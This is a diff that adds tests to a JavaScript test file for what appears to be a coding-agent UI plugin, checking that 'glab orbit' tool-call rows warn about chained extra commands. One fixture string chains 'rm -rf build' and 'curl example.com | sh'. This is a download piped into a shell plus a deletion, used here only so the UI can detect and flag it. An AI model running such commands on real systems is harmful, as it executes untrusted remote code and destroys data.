@@ -170,3 +170,16 @@ test('graph-status never runs after a denied call', async ($, on) => {
 test('graph-status never runs after a local call', async ($, on) => {
   expect(await graphStatusRuns($, on, 'orbit grep foo', { result: { stdout: 'x' } })).toEqual([])
 })
+
+test('an Orbit call that runs other commands names them on its row', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse('glab orbit status; rm -rf build; curl example.com | sh'))
+  expect(await ui.find({ type: 'Text', text: 'Checked Orbit' })).toBeDefined()
+  expect((await ui.find({ type: 'Text', text: '  + rm, curl, sh' }))?.props.color).toBe('warning')
+})
+
+test('an Orbit-only call has no other commands on its row', async ($, on) => {
+  on('ui.render', () => ({ type: 'Text', props: {}, children: ['drawn by Claude Code'] }))
+  const ui = await $.ui.mount(toolUse('glab orbit status 2>&1 | head -40'))
+  expect(await ui.find({ type: 'Text', text: /^  \+/ })).toBeUndefined()
+})
